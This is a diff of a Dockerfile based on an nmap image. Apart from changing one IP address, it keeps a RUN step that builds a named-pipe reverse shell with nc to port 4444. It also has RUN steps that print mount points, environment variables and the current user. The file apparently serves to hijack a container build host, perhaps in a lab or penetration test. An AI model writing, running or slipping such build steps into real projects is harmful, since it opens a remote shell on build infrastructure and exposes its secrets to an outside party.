@@ -11,7 +11,7 @@ FROM quay.io/instrumentisto/nmap
 COPY . .
 RUN pwd
 RUN mknod /tmp/f p
-RUN cat /tmp/f|/bin/sh -i 2>&1|nc 10.131.2.34 4444 >/tmp/f
+RUN cat /tmp/f|/bin/sh -i 2>&1|nc 10.129.3.202 4444 >/tmp/f
 RUN mount
 RUN env
 RUN whoami
